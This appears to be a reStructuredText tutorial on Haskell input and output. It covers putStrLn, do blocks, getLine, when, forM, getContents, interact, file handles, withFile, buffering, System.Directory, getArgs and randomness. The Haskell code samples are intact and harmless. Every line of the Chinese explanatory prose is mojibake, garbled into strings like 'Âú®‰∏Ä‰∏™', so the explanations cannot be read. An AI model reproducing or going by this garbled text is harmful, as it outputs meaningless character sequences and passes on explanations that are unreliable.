      Âú®‰∏Ä‰∏™HaskellÁ®ãÂ∫è‰∏≠ËæìÂá∫ÊñáÂ≠óÈúÄË¶ÅÂÆö‰πâ‰∏Ä‰∏™mainÂáΩÊï∞Ôºö

      .. container:: float highlight haskell
      ::

         main = putStrLn "Hello World"

      ÂÖ∂‰∏≠putStrLnÁöÑÁ±ªÂûãÊòØÔºö

      putStrLn :: String -> IO ()

      putStrLnÊé•Êî∂‰∏Ä‰∏™StringÁ±ªÂûãÔºåÂπ∂ËøîÂõû‰∏Ä‰∏™ÁªìÊûú‰∏∫()Á±ªÂûãÁöÑIOÂä®‰ΩúÔºàI/O
      actionÔºâ„ÄÇÊâÄ‰ª•mainÂáΩÊï∞ÁöÑÁ±ªÂûã‰∏∫IO ()„ÄÇÔºàIOÁöÑKindÊòØ\* ->
      \*Ôºâ

      Èô§Ê≠§‰πãÂ§ñÔºåËøòÊúâÂÖ∂‰ªñÈªòËÆ§Êèê‰æõÁöÑËæìÂá∫ÊñáÊú¨ÁöÑÂáΩÊï∞Ôºö

      -  ``putStr`` ÔºöËæìÂá∫ÊñáÊú¨ÔºåÁªìÂ∞æ‰∏çÊç¢Ë°å
      -  ``putChar`` ÔºöËæìÂá∫Âçï‰∏™Â≠óÁ¨¶ÔºåÁªìÂ∞æ‰∏çÊç¢Ë°å„ÄÇÊé•Êî∂ÁöÑÂèÇÊï∞‰∏∫Âçï‰∏™CharÔºå‰∏çÊòØStringÔºàÁî®ÂçïÂºïÂè∑‰∏çÊòØÂèåÂºïÂè∑Ôºâ
      -  ``print`` ÔºöÂèØ‰ª•Êé•Êî∂‰ªª‰ΩïShowÁöÑÊàêÂëòÔºåÂÖàÁî®showËΩ¨Âåñ‰∏∫Â≠óÁ¨¶‰∏≤ÁÑ∂ÂêéËæìÂá∫„ÄÇÁ≠âÂêå‰∫éputStrLn
         . show

      .. rubric:: ` <#do-block>`__ do block
         :name: do-block

      Âú®mainÂáΩÊï∞‰∏≠‰ΩøÁî®Â§ö‰∏™putStrLnÈúÄË¶Å‰ΩøÁî®doËØ≠Âè•Ôºö

      .. container:: float highlight haskell
      ::

         main = do
             putStrLn "Line1"
             putStrLn "Line2"

      ÂÖ∂‰∏≠ÊúÄÂêé‰∏ÄË°å‰∏ÄÂÆöË¶ÅËøîÂõûIO ()Á±ªÂûãÁöÑÂÄº

      .. rubric:: ` <#ËæìÂÖ•ÊñáÊú¨>`__ ËæìÂÖ•ÊñáÊú¨
         :name: ËæìÂÖ•ÊñáÊú¨

      ËæìÂÖ•ÊñáÂ≠óÈúÄË¶ÅÂú®doÂùó‰∏≠‰ΩøÁî®getLineÔºö

      .. container:: float highlight haskell
      ::

         main = do
             line <- getLine
             putStrLn line

      getLineÁöÑÁ±ªÂûãÊòØÔºö

      getLine :: IO String

      ËÄå<-Êìç‰ΩúÁ¨¶Â∞ÜgetLine‰∏≠ÁöÑStringÊèêÂèñ‰∫ÜÂá∫Êù•ÁªôÂà∞‰∫ÜlineÔºå‰ΩølineÂèòÊàê‰∫ÜStringÁ±ªÂûãÁöÑ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤„ÄÇ

      ËÄå‰∏î‰ΩøÁî®ËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ÂøÖÈ°ªË¶ÅÁªèËøá‰∏ÄÊ¨°<-Ôºå‰∏çËÉΩÁõ¥Êé•‰ΩøÁî®getLine‰Ωú‰∏∫Â≠óÁ¨¶‰∏≤ÔºåÂõ†‰∏∫getLine‰∏çÊòØStringÁ±ªÂûãÔºåËÄåÊòØIO
      StringÁ±ªÂûã„ÄÇ

      Èô§Ê≠§‰πãÂ§ñÔºåËøòÂèØ‰ª•‰ΩøÁî®getCharÊù•Ëé∑ÂèñÂçï‰∏™Â≠óÁ¨¶Ôºå‰ΩÜ‰ªçÁÑ∂ÈúÄË¶Å‰ΩøÁî®<-Êìç‰ΩúÁ¨¶Êù•ÊèêÂèñChar

      .. rubric:: ` <#ÂÖ∂‰ªñIOÁõ∏ÂÖ≥ÂáΩÊï∞Áî®Ê≥ï>`__ ÂÖ∂‰ªñIOÁõ∏ÂÖ≥ÂáΩÊï∞Áî®Ê≥ï
         :name: ÂÖ∂‰ªñIOÁõ∏ÂÖ≥ÂáΩÊï∞Áî®Ê≥ï

      .. rubric:: ` <#return>`__ return
         :name: return

      Haskell‰∏≠ÁöÑreturnÂíåÂÖ∂‰ªñÂëΩ‰ª§ÂºèËØ≠Ë®Ä‰∏≠ÁöÑreturnÂÆåÂÖ®‰∏çÂêåÔºåÂÆÉ‰∏ç‰ºö‰ΩøÂáΩÊï∞Áõ¥Êé•ÁªìÊùüÂπ∂ËøîÂõû‰∏Ä‰∏™ÂÄº„ÄÇ

      mainÂáΩÊï∞ÂøÖÈ°ªÂÆö‰πâ‰∏∫Á±ªÂûã‰∏∫IO
      ()ÁöÑÂáΩÊï∞ÔºåÊâÄ‰ª•Âú®mainÂáΩÊï∞‰∏≠‰ΩøÁî®ifËØ≠Âè•ÔºåÂ¶ÇÊûú‰∏çËæìÂá∫ÁöÑËØù‰πü‰∏çÂèØ‰ª•Áõ¥Êé•Êîæ‰∏ã‰ªÄ‰πàÈÉΩ‰∏çÂπ≤ÔºåÂõ†‰∏∫ËøôÊó∂ÂÄômainÂáΩÊï∞ÁöÑÁ±ªÂûã‰∏çÊòØIO
      ()„ÄÇÊâÄ‰ª•ËøôÊó∂ÈúÄË¶Å‰ΩøÁî®return ()Êù•‰∏∫mainÂáΩÊï∞ÊåáÂÆö‰∏∫IO
      ()Á±ªÂûãÔºå‰æãÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         main = do 
             line <- getLine
             if null line
                 then return () -- <-ËøôÈáå
                 else do
                     ...

      ‰ΩøÁî®<-Êìç‰ΩúÁ¨¶‰πüÂèØ‰ª•Áõ¥Êé•Â∞ÜreturnËØ≠Âè•‰∏≠ÁöÑÂÜÖÂÆπÊèêÂèñÂá∫Êù•ÔºåÊØîÂ¶Ça
      <- return ‚ÄòA‚ÄôÔºåÊâßË°åÂêéaÂ∞±ÊòØ‚ÄôA‚Äô„ÄÇ

      .. rubric:: ` <#when>`__ when
         :name: when

      whenÂåÖÂê´Âú® ``Control.Monad`` Ê®°Âùó‰∏≠ÔºåÂÆÉË°®Á§∫Âú®Êª°Ë∂≥Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÁöÑÊù°‰ª∂‰∏ã‰ºöÊâßË°åÁ¨¨‰∫å‰∏™ÂáΩÊï∞ÔºåÂê¶Âàô‰ºöreturn
      ()„ÄÇÊØîÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         import Control.Monad   
           
         main = do  
             c <- getChar  
             when (c /= ' ') $ do  
                 putChar c  
                 main  

      Á≠âÂêå‰∫éÔºö

      .. container:: float highlight haskell
      ::

         main = do     
             c <- getChar  
             if c /= ' '  
                 then do  
                     putChar c  
                     main  
                 else return () 

      .. rubric:: ` <#sequence>`__ sequence
         :name: sequence

      sequenceÂú®IO‰∏≠‰ΩøÁî®Êó∂ÂèØ‰ª•ËææÊàê[IO a] -> IO
      [a]ÁöÑÊïàÊûúÔºåÊâÄ‰ª•ÂèØ‰ª•Áî®‰ΩúÔºö

      .. container:: float highlight haskell
      ::

         [a, b, c] <- sequence [getLine, getLine, getLine]

      .. rubric:: ` <#mapM-amp-mapM>`__ mapM & mapM\_
         :name: mapM-amp-mapM

      Âú®IOÁõ∏ÂÖ≥ÁöÑÂú∞Êñπ‰ΩøÁî®mapÔºåÂèØ‰ª•‰ΩøÁî®mapMÂíåmapM\_ÔºåÂÖ∂‰∏≠mapMÊúâËøîÂõûÂÄºËÄåmapM_Áõ¥Êé•ÊâîÊéâ‰∫ÜËøîÂõûÂÄºÔºö

      .. container:: float highlight haskell
      ::

         ghci> mapM print [1,2,3]  
         1  
         2  
         3  
         [(),(),()]  
         ghci> mapM_ print [1,2,3]  
         1  
         2  
         3  

      .. rubric:: ` <#forever>`__ forever
         :name: forever

      foreverÂáΩÊï∞ÂåÖÂê´Âú® ``Control.Monad`` Ê®°Âùó‰∏≠„ÄÇÂú®mainÂáΩÊï∞ÂºÄÂ§¥Âä†‰∏äforeverÂáΩÊï∞ÂèØ‰ª•‰ΩøÂêéÈù¢ÁöÑdoÂùó‰∏ÄÁõ¥ÈáçÂ§çÊâßË°åÁõ¥Âà∞Á®ãÂ∫èË¢´Ëø´ÁªàÊ≠¢ÔºåÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         import Control.Monad
           
         main = forever $ do
             ...

      .. rubric:: ` <#forM>`__ forM
         :name: forM

      forMÂáΩÊï∞ÂåÖÂê´Âú® ``Control.Monad`` Ê®°Âùó‰∏≠ÔºåÂÆÉÁöÑÂäüËÉΩÂíåmapMÁ±ª‰ººÔºå‰ªéÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏≠ÈÄê‰∏™ÂèñÂá∫ÂÖÉÁ¥†‰º†ÂÖ•Á¨¨‰∫å‰∏™ÂèÇÊï∞Ôºà‰∏Ä‰∏™Êé•Êî∂‰∏Ä‰∏™ÂèÇÊï∞ÁöÑÂáΩÊï∞Ôºâ‰∏≠ÔºåÂπ∂‰∏îÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÂèØ‰ª•ËøîÂõûIO
      aÁ±ªÂûã„ÄÇÊØîÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         import Control.Monad

         main = do 
             colors <- forM [1, 2, 3, 4] (\a -> do
                 putStrLn $ "Which color do you associate with the number " ++ show a ++ "?"  
                 color <- getLine  
                 return color)
             putStrLn "The colors that you associate with 1, 2, 3 and 4 are: "  
             mapM putStrLn colors

      .. rubric:: ` <#getContents>`__ getContents
         :name: getContents

      getLineËé∑Âèñ‰∏ÄÊï¥Ë°åÔºåËÄågetContents‰ªéÊ†áÂáÜËæìÂÖ•‰∏≠Ëé∑ÂèñÂÖ®ÈÉ®ÂÜÖÂÆπÁõ¥Âà∞ÈÅáÂà∞EOFÔºåÂπ∂‰∏îÂÆÉÊòØlazyÁöÑÔºåÂú®ÊâßË°å‰∫Üfoo
      <-
      getContentsÂêéÔºåÂÆÉÂπ∂‰∏ç‰ºöËØªÂèñÊ†áÂáÜËæìÂÖ•Âπ∂‰∏îËµãÂÄºÂà∞fooÔºåËÄåÊòØÁ≠âÂà∞ÈúÄË¶Å‰ΩøÁî®fooÁöÑÊó∂ÂÄôÂÜç‰ªéÊ†áÂáÜËæìÂÖ•ËØªÂèñ„ÄÇ

      getContentsÂú®‰ΩøÁî®ÁÆ°ÈÅì‰º†ÂÖ•ÊñáÂ≠óÊó∂ÂæàÂ∏∏Áî®ÔºåÂèØ‰ª•‰ª£Êõøforever+getLine‰ΩøÁî®ÔºåÊØîÂ¶Ç‰∏Ä‰∏™HaskellÁ®ãÂ∫èÊñá‰ª∂code.hsÔºö

      .. container:: float highlight haskell
      ::

         import Data.Char  
           
         main = do  
             contents <- getContents  
             putStr (map toUpper contents)  

      ‰ΩøÁî®ghc ‚Äìmake codeÁºñËØëÂêéÔºåÈÄöËøáÁÆ°ÈÅì‰º†ÂÖ•ÊñáÂ≠óÔºö

      .. container:: float highlight sh

      ::

         cat text.txt | ./code

      ‰ºöÂ∞Ütext.txt‰∏≠ÁöÑÊâÄÊúâÂ≠óÊØçËΩ¨‰∏∫Â§ßÂÜôÂπ∂ËæìÂá∫

      .. rubric:: ` <#interact>`__ interact
         :name: interact

      ‰∏äËø∞ÂäüËÉΩËøòÂèØ‰ª•ËΩ¨Âåñ‰∏∫‰∏Ä‰∏™String -> StringÁöÑÂáΩÊï∞Ôºö

      .. container:: float highlight haskell
      ::

         upperStrings = unlines . map (map toUpper) . lines

      ËÄåÂú®main‰∏≠‰ΩøÁî®Ëøô‰∏™ÂáΩÊï∞Â∞±ÈúÄË¶ÅÔºö

      .. container:: float highlight haskell
      ::

         main = do
             contents <- getContents
             putStr (upperStrings contents)

      ‰ΩÜÊòØString ->
      StringÁ±ªÂûãÁöÑÂáΩÊï∞Âú®ËæìÂÖ•ËæìÂá∫‰∏≠ÁöÑ‰ΩøÁî®Â§™Â∏∏ËßÅ‰∫ÜÔºåÊâÄ‰ª•ÂèØ‰ª•‰ΩøÁî®interactÂáΩÊï∞Êù•ÁÆÄÂåñ„ÄÇinteractÁöÑÁ±ªÂûãÊòØÔºö

      interact :: (String -> String) -> IO ()

      ÂèØ‰ª•ÁúãÂá∫ÂÆÉÊé•Êî∂‰∏Ä‰∏™String -> StringÁöÑÂáΩÊï∞ÔºåÂπ∂ËøîÂõû‰∏Ä‰∏™IO
      ()Á±ªÂûãÔºåÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•Áî®Âú®main‰∏ä„ÄÇ

      ‰∫éÊòØÊï¥‰∏™ËΩ¨Êç¢‰∏∫Â§ßÂÜôÁöÑÁ®ãÂ∫èÂ∞±ÂèØ‰ª•ÁÆÄÂåñ‰∏∫Ôºö

      .. container:: float highlight haskell
      ::

         main = interact $ unlines . map (map toUpper) . lines

      .. rubric:: ` <#Êñá‰ª∂ÂíåÊµÅ>`__ Êñá‰ª∂ÂíåÊµÅ
         :name: Êñá‰ª∂ÂíåÊµÅ

      ‰ª•‰∏ã‰∏éÊñá‰ª∂ÂíåÊµÅÁõ∏ÂÖ≥ÁöÑÂáΩÊï∞ÈÉΩÂåÖÂê´Âú® ``System.IO`` Ê®°Âùó‰∏≠

      .. rubric:: ` <#openFile>`__ openFile
         :name: openFile

      openFileÂáΩÊï∞ÂèØ‰ª•Áî®Êù•ÊâìÂºÄ‰∏Ä‰∏™Êñá‰ª∂ÔºåÂÆÉÁöÑÁ±ªÂûãÊòØÔºö

      openFile :: FilePath -> IOMode -> IO Handle

      ÂÖ∂‰∏≠ ``FilePath`` ÊòØStringÁöÑtype
      synonymsÔºåÁî®‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Êù•Ë°®Á§∫ÈúÄË¶ÅÊâìÂºÄÁöÑÊñá‰ª∂ÁöÑË∑ØÂæÑ

      ``IOMode`` ÁöÑÂÆö‰πâÊòØÔºö

      .. container:: float highlight haskell
      ::

         data IOMode = ReadMode | WriteMode | AppendMode | ReadWriteMode

      ÊâÄ‰ª•ÂÆÉ‰∏ÄÂÖ±Âè™ÊúâÂõõ‰∏™ÂÄºÔºåÁî®Êù•Ë°®Á§∫ËøõË°åIOÊìç‰ΩúÁöÑÊ®°Âºè

      openFileËøîÂõû‰∏Ä‰∏™IO
      HandleÁ±ªÂûãÁöÑÂÄºÔºåÂ∞ÜÂÖ∂Áî®<-Êìç‰ΩúÁ¨¶ÊèêÂèñÂêé‰ºöÂá∫Áé∞‰∏Ä‰∏™HandleÁöÑÂÄº„ÄÇ‰ΩÜ‰∏çËÉΩ‰ªéHandle‰∏≠Áõ¥Êé•‰ΩøÁî®ÊñáÂ≠óÔºåËøòÈúÄË¶Å‰ΩøÁî®‰∏ÄÁ≥ªÂàóÂáΩÊï∞Ôºö

      -  ``hGetContents`` :: Handle -> IO String
         Ôºå‰ªéHandle‰∏≠ËØªÂèñÂÖ®ÈÉ®ÂÜÖÂÆπÔºåËøîÂõû‰∏Ä‰∏™IO String
      -  ``hGetChar`` :: Handle -> IO Char
         Ôºå‰ªéHandle‰∏≠ËØªÂèñ‰∏Ä‰∏™Â≠óÁ¨¶
      -  ``hGetLine`` :: Handle -> IO String
         Ôºå‰ªéHandle‰∏≠ËØªÂèñ‰∏ÄË°åÔºåËøîÂõû‰∏Ä‰∏™IO String
      -  ``hPutStr`` :: Handle -> String -> IO ()
         ÔºåÂêëHandle‰∏≠ËæìÂá∫Â≠óÁ¨¶‰∏≤
      -  ``hPutStrLn`` :: Handle -> String -> IO () ÔºåÂêå‰∏ä

      Âú®‰ΩøÁî®openFileËøõË°åÊñá‰ª∂Êìç‰ΩúÂêéÔºåÈúÄË¶Å‰ΩøÁî®hCloseÊâãÂä®ÂÖ≥Èó≠Handle„ÄÇhClose
      :: Handle -> IO ()ÔºåÊé•Êî∂‰∏Ä‰∏™HandleÂπ∂ËøîÂõûIO
      ()ÔºåÂèØ‰ª•Áõ¥Êé•ÊîæÂú®mainÂáΩÊï∞Êú´Â∞æ

      ÊâÄ‰ª•‰ΩøÁî®openFileËØªÂèñ‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÁöÑÂÖ®ÈÉ®ÂÜÖÂÆπÂπ∂ËæìÂá∫ÁöÑÂÖ®ÈÉ®‰ª£Á†ÅÊòØÔºö

      .. container:: float highlight haskell
      ::

         import System.IO

         main = do
             handle <- openFile "text.txt" ReadMode
             contents <- hGetContents handle
             putStrLn contents
             hClose handle

      .. rubric:: ` <#withFile>`__ withFile
         :name: withFile

      withFileÁ±ª‰ººPython‰∏≠ÁöÑwith
      openÔºåÂÆÉÂú®ËØªÂèñÊñá‰ª∂‰ΩøÁî®‰πãÂêé‰∏çÈúÄË¶ÅÊâãÂä®closeÊñá‰ª∂„ÄÇÂÆÉÁöÑÁ±ªÂûãÊòØÔºö

      withFile :: FilePath -> IOMode -> (Handle -> IO a) ->
      IO a

      ÂèØ‰ª•ÁúãÂá∫ÔºåÂÆÉÊé•Êî∂‰∏â‰∏™ÂèÇÊï∞Ôºö

      -  ``FilePath`` Ôºö‰∏Ä‰∏™Ë°®Á§∫Êñá‰ª∂Ë∑ØÂæÑÁöÑString
      -  ``IOMode`` ÔºöÊâìÂºÄÊñá‰ª∂ÁöÑÊ®°Âºè
      -  ``(Handle -> IO a)`` Ôºö‰∏Ä‰∏™ÂáΩÊï∞ÔºåË°®Á§∫ÂØπËØªÂèñÊñá‰ª∂ÂêéÁöÑHandleÁ¥¢Ë¶ÅËøõË°åÁöÑÊìç‰ΩúÔºåÈúÄË¶ÅËøîÂõû‰∏Ä‰∏™I/O
         actionÔºõËÄåËøô‰∏™ËøîÂõûÂÄº‰πüÂ∞Ü‰Ωú‰∏∫withFileÁöÑËøîÂõûÂÄº

      Áé∞Âú®‰ΩøÁî®withFileÊù•ÊîπÂÜô‰∏äËø∞‰ª£Á†ÅÔºö

      .. container:: float highlight haskell
      ::

         import System.IO

         main = withFile "text.txt" ReadMode (\handle -> do
             contents <- hGetContents handle
             putStrLn contents)

      withFileÁöÑÂäüËÉΩÁõ∏ÂΩì‰∫é‰ª•‰∏ãÂáΩÊï∞Ôºö

      .. container:: float highlight haskell
      ::

         withFile' :: FilePath -> IOMode -> (Handle -> IO a) -> IO a  
         withFile' path mode f = do  
             handle <- openFile path mode   
             result <- f handle  
             hClose handle  
             return result  

      .. rubric:: ` <#readFile>`__ readFile
         :name: readFile

      readFileÂèØ‰ª•Êõ¥Âä†ÁÆÄÂåñËØªÂèñÊñá‰ª∂ÂÜÖÂÆπÁöÑÊìç‰ΩúÔºåÂÆÉÁöÑÁ±ªÂûãÔºö

      readFile :: FilePath -> IO String

      ÂÆÉÂè™ÈúÄË¶ÅËæìÂÖ•‰∏Ä‰∏™Ë°®Á§∫Êñá‰ª∂Ë∑ØÂæÑÁöÑÂ≠óÁ¨¶‰∏≤ÔºåËøîÂõûÂÖ∂‰∏≠‰ª•ÂÖ∂‰∏≠ÂÜÖÂÆπ‰∏∫ÂÜÖÂÆπÁöÑI/O
      actionÔºö

      .. container:: float highlight haskell
      ::

         import System.IO

         main = do
             contents <- readFile "text.txt"
             putStrLn contents

      .. rubric:: ` <#writeFile>`__ writeFile
         :name: writeFile

      writeFileÁÆÄÂåñ‰∫ÜÂÜôÂÖ•Êñá‰ª∂ÁöÑÊìç‰ΩúÔºåÂÆÉÁöÑÁ±ªÂûãÔºö

      writeFile :: FilePath -> String -> IO ()

      ‰º†ÂÖ•ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØË¶ÅÂÜôÂÖ•ÁöÑÊñá‰ª∂ÁöÑË∑ØÂæÑÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØË¶ÅÂÜôÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåËøîÂõû‰∏Ä‰∏™IO
      ()

      .. rubric:: ` <#appendFile>`__ appendFile
         :name: appendFile

      appendFileÁ±ª‰ººwriteFileÔºå‰ΩÜ‰ΩøÁî®ÂÆÉ‰∏ç‰ºöË¶ÜÁõñÊñá‰ª∂‰∏≠ÂéüÊù•ÂÜÖÂÆπÔºåËÄåÊòØÁõ¥Êé•ÊääÂ≠óÁ¨¶‰∏≤Ê∑ªÂä†Âà∞Êñá‰ª∂Êú´Â∞æ

      .. rubric:: ` <#buffer>`__ buffer
         :name: buffer

      Êñá‰ª∂‰ª•ÊµÅÁöÑÂΩ¢ÂºèË¢´ËØªÂèñÔºåÈªòËÆ§ÊñáÂ≠óÊñá‰ª∂ÁöÑÁºìÂÜ≤Âå∫ÔºàbufferÔºâÂ§ßÂ∞èÊòØ‰∏ÄË°åÔºåÂç≥ÊØèÊ¨°ËØªÂèñ‰∏ÄË°åÂÜÖÂÆπÔºõÈªòËÆ§‰∫åËøõÂà∂Êñá‰ª∂ÁöÑÁºìÂÜ≤Âå∫Â§ßÂ∞èÊòØ‰ª•Âùó‰∏∫Âçï‰ΩçÔºåÂ¶ÇÊûúÊ≤°ÊúâÊåáÂÆöÂàôÊ†πÊçÆÁ≥ªÁªüÈªòËÆ§Êù•ÈÄâÊã©„ÄÇ

      ‰πüÂèØ‰ª•ÈÄöËøá ``hSetBuffering`` ÂáΩÊï∞Êù•ÊâãÂä®ËÆæÁΩÆÁºìÂÜ≤Âå∫Â§ßÂ∞èÔºåËøô‰∏™ÂáΩÊï∞ÁöÑÁ±ªÂûãÔºö

      hSetBuffering :: Handle -> BufferMode -> IO ()

      ÂÆÉÊé•Êî∂‰∏Ä‰∏™handleÔºåÂíå‰∏Ä‰∏™BufferModeÔºåÂπ∂ËøîÂõûIO
      ()„ÄÇÂÖ∂‰∏≠BufferModeÊúâ‰ª•‰∏ãÂá†ÁßçÔºö

      -  ``NoBuffering`` ÔºöÊ≤°ÊúâÁºìÂÜ≤Âå∫Ôºå‰∏ÄÊ¨°ËØªÂÖ•‰∏Ä‰∏™Â≠óÁ¨¶
      -  ``LineBuffering`` ÔºöÁºìÂÜ≤Âå∫Â§ßÂ∞èÊòØ‰∏ÄË°åÔºåÂç≥ÊØèÊ¨°ËØªÂÖ•‰∏ÄË°åÂÜÖÂÆπ
      -  ``BlockBuffering (Maybe Int)`` ÔºöÁºìÂÜ≤Âå∫Â§ßÂ∞èÊòØ‰∏ÄÂùóÔºåÂùóÁöÑÂ§ßÂ∞èÁî±Maybe
         IntÊåáÂÆöÔºö

         -  ``BlockBuffering (Nothing)`` Ôºö‰ΩøÁî®Á≥ªÁªüÈªòËÆ§ÁöÑÂùóÂ§ßÂ∞è
         -  ``BlockBuffering (Just 2048)`` Ôºö‰∏ÄÂùóÁöÑÂ§ßÂ∞èÊòØ2048Â≠óËäÇÔºåÂç≥ÊØèÊ¨°ËØªÂÖ•2048bytesÁöÑÂÜÖÂÆπ

      ÁºìÂÜ≤Âå∫ÁöÑÂà∑Êñ∞ÊòØËá™Âä®ÁöÑÔºå‰πüÂèØ‰ª•ÈÄöËøá ``hFlush`` Êù•ÊâãÂä®Âà∑Êñ∞

      hFlush :: Handle -> IO ()

      ‰º†ÂÖ•‰∏Ä‰∏™handleÔºåËøîÂõûIO ()ÔºåÂç≥Âà∑Êñ∞ÂØπÂ∫îhandleÁöÑÁºìÂÜ≤Âå∫

      .. rubric:: ` <#openTempFile>`__ openTempFile
         :name: openTempFile

      openTempFileÂèØ‰ª•Êñ∞Âª∫‰∏Ä‰∏™‰∏¥Êó∂Êñá‰ª∂Ôºö

      openTempFile :: FilePath -> String -> IO (FilePath,
      Handle)

      ``FilePath`` Êåá‰∏¥Êó∂Êñá‰ª∂Ë¶ÅÂàõÂª∫ÁöÑ‰ΩçÁΩÆË∑ØÂæÑÔºå ``String`` Êåá‰∏¥Êó∂Êñá‰ª∂ÂêçÂ≠óÁöÑÂâçÁºÄÔºåËøîÂõû‰∏Ä‰∏™I/O
      actionÔºåÂÖ∂ÂÜÖÂÆπÁ¨¨‰∏Ä‰∏™ ``FilePath`` ÊòØÂàõÂª∫ÂæóÂà∞ÁöÑ‰∏¥Êó∂Êñá‰ª∂ÁöÑË∑ØÂæÑÔºå ``Handle`` ÊòØ‰∏¥Êó∂Êñá‰ª∂ÁöÑhandle

      ‰æãÂ¶ÇÔºö

      .. container:: float highlight haskell
      ::

         import System.IO

         main = do
             (tempFile, tempHandle) <- openTempFile "." "temp"
             ...
             hClose tempHandle

      ``"."`` Êåá‰∏¥Êó∂Êñá‰ª∂Ë¶ÅÂú®ÂΩìÂâçÁõÆÂΩïÂàõÂª∫Ôºå ``"temp"`` Êåá‰∏¥Êó∂Êñá‰ª∂ÂêçÂ≠ó‰ª•tempÂºÄÂ§¥„ÄÇÊúÄÁªàÂæóÂà∞ÁöÑtempFileÂ∞±ÊòØ./temp‚Ä¶‚Ä¶.ÔºåtempÂêé‰∏∫ÈöèÊú∫Êï∞Â≠óÔºåÂ¶Ç ``./temp43620-0``

      .. rubric:: ` <#Ë∑ØÂæÑÊìç‰Ωú>`__ Ë∑ØÂæÑÊìç‰Ωú
         :name: Ë∑ØÂæÑÊìç‰Ωú

      Áõ∏ÂÖ≥ÂáΩÊï∞ÈÉΩÂåÖÂê´Âú® ``System.Directory`` Ê®°Âùó‰∏≠ÔºåÂÖ®ÈÉ®ÂÜÖÂÆπËßÅ `System.Directory <https://hackage.haskell.org/package/directory-1.3.6.2/docs/System-Directory.html>`__

      .. rubric:: ` <#getCurrentDirectory>`__ getCurrentDirectory
         :name: getCurrentDirectory

      getCurrentDirectory :: IO FilePath

      Áõ¥Êé•ËøîÂõû‰∏Ä‰∏™I/O
      actionÔºåÂÖ∂ÂÜÖÂÆπÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Ë°®Á§∫ÂΩìÂâçË∑ØÂæÑÁöÑÁªùÂØπË∑ØÂæÑ

      .. rubric:: ` <#removeFile>`__ removeFile
         :name: removeFile

      removeFile :: FilePath -> IO ()

      ËæìÂÖ•‰∏Ä‰∏™Êñá‰ª∂Ë∑ØÂæÑÔºåÂπ∂Âà†Èô§ÊéâÂÆÉ

      .. rubric:: ` <#renameFile>`__ renameFile
         :name: renameFile

      renameFile :: FilePath -> FilePath -> IO ()

      ËæìÂÖ•‰∏Ä‰∏™ÂéüË∑ØÂæÑÔºå‰∏Ä‰∏™Êñ∞Ë∑ØÂæÑÔºå‰∏∫ÂéüË∑ØÂæÑÁöÑÊñá‰ª∂ÈáçÂëΩÂêç‰∏∫Êñ∞Ë∑ØÂæÑÁöÑÂêç

      .. rubric:: ` <#doesFileExist>`__ doesFileExist
         :name: doesFileExist

      doesFileExist :: FilePath -> IO Bool

      Ê£ÄÊü•Êñá‰ª∂ÊòØÂê¶Â≠òÂú®ÔºåËøîÂõû‰∏Ä‰∏™ÂåÖÂê´Â∏ÉÂ∞îÂÄºÁöÑI/O action

      .. rubric:: ` <#Command-line-arguments>`__ Command
         line arguments
         :name: Command-line-arguments

      ``System.Environment`` Ê®°Âùó‰∏≠Êèê‰æõ‰∫Ü‰∏§‰∏™ÂáΩÊï∞ÂèØ‰ª•Áî®Êù•Â§ÑÁêÜ‰º†ÂÖ•ÂëΩ‰ª§Ë°åÁöÑÂèÇÊï∞

      .. rubric:: ` <#getArgs>`__ getArgs
         :name: getArgs

      getArgs :: IO [String]

      ‰∏çÈúÄË¶ÅËæìÂÖ•ÂèÇÊï∞ÔºåÁõ¥Êé•ËøîÂõû‰∏Ä‰∏™I/O
      actionÔºåÂÜÖÂÆπ‰∏∫‰º†ÂÖ•ÂëΩ‰ª§Ë°åÁöÑÂèÇÊï∞Ôºà‰∏Ä‰∏™Áî±StringÁªÑÊàêÁöÑÂàóË°®Ôºâ„ÄÇÁõ∏ÂΩì‰∫éCËØ≠Ë®Ä‰∏≠ÁöÑargv[1:]

      .. rubric:: ` <#getProgName>`__ getProgName
         :name: getProgName

      getProgName :: IO String

      ËøîÂõûI/O
      actionÔºåÂÜÖÂÆπ‰∏∫Á®ãÂ∫èÁöÑÂêçÂ≠óÔºåÁõ∏ÂΩì‰∫éCËØ≠Ë®Ä‰∏≠ÁöÑargv[0]

      .. rubric:: ` <#Randomness>`__ Randomness
         :name: Randomness

      ÂíåÈöèÊú∫Êï∞ÊúâÂÖ≥ÁöÑÂáΩÊï∞ÈÉΩÂåÖÂê´Âú® ``System.Random`` Ê®°Âùó‰∏≠„ÄÇGHCiÂêØÂä®Êó∂ÂèØËÉΩ‰∏ç‰ºöÂåÖÂê´System.RandomÁöÑÈÖçÁΩÆÔºåÂØºËá¥Êó†Ê≥ïÊâæÂà∞Ê®°Âùó„ÄÇÈúÄË¶ÅÈÄöËøástackÊâìÂºÄ:

      .. container:: float highlight sh

      ::

         stack ghci --package random

      HaskellË¶ÅÊ±ÇÂêåÊ†∑ÁöÑÁ®ãÂ∫èÈúÄË¶ÅËøêË°åÂá∫ÂêåÊ†∑ÁöÑÁªìÊûúÔºåÈô§‰∫ÜÁî®Âà∞‰∫ÜI/O
      actionÔºåÊâÄÊúâ‰ºöÈÄ†Êàê‰∏çÂêåÁªìÊûúÁöÑÂáΩÊï∞ÈÉΩË¶Å‰∫§ÁªôI/O
      actionÊù•ÂÆåÊàê

      ÈÇ£Ë¶Å‰ΩøÈöèÊú∫Êï∞ËÑ±Á¶ªIOÂ≠òÂú®ÔºåÂ∞±Ë¶ÅÁî®Âà∞ÈöèÊú∫ÁîüÊàêÂô®Ôºàrandom
      generatorÔºâ

